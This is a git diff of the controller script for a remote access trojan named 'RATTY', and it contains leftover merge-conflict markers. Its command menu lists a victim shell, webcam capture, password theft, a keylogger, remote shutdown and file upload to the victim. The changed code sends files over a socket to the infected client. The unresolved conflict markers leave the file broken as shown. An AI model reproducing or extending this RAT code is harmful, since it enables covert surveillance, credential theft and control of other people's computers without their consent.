@@ -1,8 +1,12 @@
 #!/usr/bin/env python3
 
+<<<<<<< HEAD
 
+=======
+>>>>>>> 1dfd7c5c794af6bb5556601ae868644d72aba9b8
 import socket, subprocess
-from pyfiglet import Figlet
+import pyfiglet
+import time
 
 
 class SERVER:
@@ -52,13 +56,17 @@ class SERVER:
         
     # logo for the RAT
     def rattylogo(self):
-        f = Figlet(font='isometric2')
-        print(f.renderText('RATTY'))
+        logo = pyfiglet.figlet_format("Ratty")
+        print(logo)
         print('\n \n ====================================================================== \n \n \n \n Welcome to RATTY, your neighborhood remote administraion tool \n \n')
         
     # prompts given to the user to run commands in the cli    
     def prompts(self):
+<<<<<<< HEAD
         print('============================== Commands: ============================== \n \n shutdown                      turns off victim machine \n shell                         makes a shell to interact with victim machine \n webcam                        captures webcam \n webcamoff                     turns off webcam \n monitoron                     turns on monitor \n monitoroff                    turns off monitor \n gimmepw                       gives user password \n keyloggeron                   turns on keylogger \n keyloggeroff                  turns off keylogger \n upload <file>                 uploads file              nmap \n             \n help                         show all commands \n exit                          exit RATTY\n \n======================================================================\n \n')
+=======
+        print('============================== Commands: ============================== \n \n shutdown                      turns off victim machine \n shell                         makes a shell to interact with victim machine \n webcam                        captures webcam \n webcamoff                     turns off webcam \n monitoron                     turns on monitor \n monitoroff                    turns off monitor \n gimmepw                       gives user password \n keyloggeron                   turns on keylogger \n keyloggeroff                  turns off keylogger \n upload                        uploads file \n help                          show all commands \n exit                          exit RATTY\n \n======================================================================\n \n')
+>>>>>>> 1dfd7c5c794af6bb5556601ae868644d72aba9b8
         
     def mainloop(self):
         self.rattylogo()
@@ -99,14 +107,14 @@ class SERVER:
                     self.stop_vidstream()
             
                 case 'upload':
+                    filename = str(input('What file would you like to upload include extension: '))
+                    file = open(filename, "rb")
                     client.send(command.encode())
-                    file = str(input("Enter the filepath to the file: "))
-                    filename = str(input("Enter the filepath to outcoming file (with filename and extension): "))
-                    data = open(file, 'rb')
-                    filedata = data.read(2147483647)
-                    client.send(filename.encode())
-                    print("SENT")
-                    client.send(filedata)
+                    client.send(file.name.encode())
+                    time.sleep(1)
+                    bytes = file.read(1024)
+                    client.send(bytes)
+                    
             
                 case 'help':
                     self.prompts()
